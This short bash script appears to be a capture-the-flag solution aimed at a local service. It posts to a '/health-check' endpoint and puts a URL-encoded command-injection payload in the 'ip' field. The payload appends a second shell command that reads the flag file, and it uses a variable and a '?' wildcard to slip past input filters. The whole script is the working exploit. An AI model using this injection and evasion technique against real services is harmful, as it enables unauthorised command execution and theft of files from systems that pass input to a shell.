#!/bin/bash

HOST=localhost
PORT=42466
curl -s 'http://'$HOST':'$PORT'/health-check' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'ip=localhost%20%3B%20x%3D%27cat%20%2Fflag%3Ftxt%27%3B%24x' | grep BCC
